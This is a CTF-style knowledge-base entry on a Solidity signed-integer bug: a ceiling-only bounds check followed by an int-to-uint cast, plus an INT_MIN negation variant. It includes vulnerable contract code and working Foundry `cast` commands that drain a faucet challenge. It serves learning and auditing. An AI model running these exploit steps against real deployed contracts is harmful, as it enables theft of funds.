---
id: web3-signed-int-cast-unsigned-underflow
category: WEB
tags: [web3, blockchain, evm, solidity, integer, signed, int64, uint64, int256, cast, type-confusion, underflow, overflow, negative-bounds, modulo, faucet, payout, drain-balance, bypass-require, htb, cyber-apocalypse, lucky-faucet, foundry, positive, crewctf, int-min, two-s-complement, negate, abs, positivity-check]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3 — signed bound/value validated by <= then cast to unsigned = underflow → giant payout"
difficulty: easy
created: 2026-10-08
updated: 2026-10-08
related: [web3-weak-onchain-randomness-blockhash, web3-receive-fallback-weak-access-control]
---

## How to recognize this pattern

- A value the attacker controls is declared **signed** (`int64`, `int256`) and validated only with
  `require(x <= MAX)` — **with no floor** (`>= MIN`). A **negative** value passes the `<=` trivially.
- That value then feeds a calculation whose result is **cast to unsigned** (`uint64(...)`,
  `uint256(...)`) before becoming an amount/index/limit. If the calculation goes negative, the cast
  **wraps around** → it becomes a gigantic number (near `2**64`/`2**256`).
- Typical symptom: a faucet/payout/lottery that "only sends a few wei" but has a `setBounds`/`setLimit`
  with a signed type. The hole isn't the randomness — it's the **sign + cast**.

## Method

Reference case: HTB Cyber Apocalypse 2024 — Lucky Faucet (Solidity 0.7.6). `int64` bounds, validated by
ceiling only:
```solidity
int64 public upperBound; int64 public lowerBound;
function setBounds(int64 _lo, int64 _hi) public {
    require(_hi <= 100_000_000, "...");   // ceiling only
    require(_lo <=  50_000_000, "...");   // ceiling only -> negative passes
    require(_lo <= _hi);
    upperBound = _hi; lowerBound = _lo;
}
function sendRandomETH() public returns (bool, uint64) {
    int256 randomInt = int256(blockhash(block.number - 1));
    uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); // <-- cast
    bool sent = msg.sender.send(amountToSend);
    return (sent, amountToSend);
}
```
Win (`Setup`): `address(TARGET).balance <= INITIAL_BALANCE - 10 ether` (contract starts with 500 ETH).

With `setBounds(-100_000_000, 100_000_000)`: `_lo=-100M <= 50M` ✓, `_hi=100M <= 100M` ✓,
`_lo <= _hi` ✓. Now `randomInt % range + lowerBound` can be **negative**; `uint64(negative)` wraps
around to ~`1.8e19` wei (≈ 18 ETH) in a single `sendRandomETH` → exceeds the 10 ETH.

### Exploit (`cast` only, off-chain)

```bash
CAST=~/.config/.foundry/bin/cast
RPC="<rpc>"; PK="<private key in the terminal>"; TARGET="<instance>"; SETUP="<setup>"
# 1) open the floor to negative (note the -- so cast doesn't treat the '-' as a flag)
$CAST send $TARGET 'setBounds(int64,int64)' --rpc-url $RPC --private-key $PK -- '-100000000' '100000000'
$CAST call $TARGET 'lowerBound()(int64)' --rpc-url $RPC    # sanity: -100000000
# 2) withdraw (repeat if the block's blockhash gives a small positive remainder)
$CAST send $TARGET 'sendRandomETH()' --rpc-url $RPC --private-key $PK
$CAST call $SETUP 'isSolved()(bool)' --rpc-url $RPC        # true once balance dropped >= 10 ETH
```
See `Manuals/Web3/3. Contexto para Claude.md` (`instance.json` flow → `isSolved()` → flag from the launcher).

### Variant: `-INT_MIN`/`abs(INT_MIN)` stays negative (CrewCTF 2023 — Positive)

Same family (signed int + 0.7.6 without revert), a sibling trick to the cast: the **minimum** of an
`intN` **has no positive counterpart** in two's-complement, so **negating the minimum returns the
minimum itself** (still negative) — and in 0.7.6 that overflow **doesn't revert**. Type fact (REPL):
```solidity
int64 n = -9223372036854775808;   // INT64_MIN
-n;                               // == -9223372036854775808  (negating the minimum = the minimum!)
int64(9223372036854775807 + 1);   // == -9223372036854775808  (overflows, no revert)
```
When the contract tries to "ensure positivity" via negation/`abs` of a negative number (the
`if (n < 0) n = -n;` pattern) and then trusts the result is `> 0`, passing `INT64_MIN` breaks it: it
enters negative, the "abs" returns negative, and the sign logic is bypassed → in **Positive** that's
enough for `solved = true`. Pass the negative arg with the same `--` care:
```bash
$CAST send $TARGET '<fn>(int64)' --rpc-url $RPC --private-key $PK -- '-9223372036854775808'
```
Generalizes to any `intN`: the minimum is `-2**(N-1)`; `abs`/negation of it = itself.

## Gotchas

- **`cast` and negative arguments:** use `--` before the args so `-100000000` isn't read as a flag.
- `%` in Solidity preserves the dividend's sign → the negative result only appears when `lowerBound < 0`
  is low enough to pull the sum below zero. If a withdrawal yields a small value, repeat it (the
  blockhash changes per block).
- **0.7.6 has no built-in SafeMath** (pre-0.8) — but here you don't even need arithmetic overflow: the
  trick is the **explicit cast** `int→uint`, which never reverts, it just reinterprets the bits.
- Don't confuse it with `web3-weak-onchain-randomness-blockhash`: there the hole is predictability; here
  the blockhash is just the source of the number — the bug is the signed type + cast.

## Transferable lesson

Whenever a signed input (`int*`) is validated by ceiling only (`<=`) and then **cast to unsigned** or
used as an amount/index: test **negative values**. Missing the floor (`require(x >= 0)` /
`require(x >= MIN)`) → a negative gets in and the `int→uint` cast becomes a wraparound = a gigantic
amount/index. Checklist: does every range `require` have **both** sides? Is the type signed? Is there a
`uintN(expr)` afterward?

## Related / Cross-reference

- `Arsenal/WEB/web3-weak-onchain-randomness-blockhash.md` — same "block faucet/lottery" family, but a
  predictability hole (not a type one).
- `Manuals/Web3/3. Contexto para Claude.md` — `cast`/`forge`, the Setup/isSolved/launcher flow.
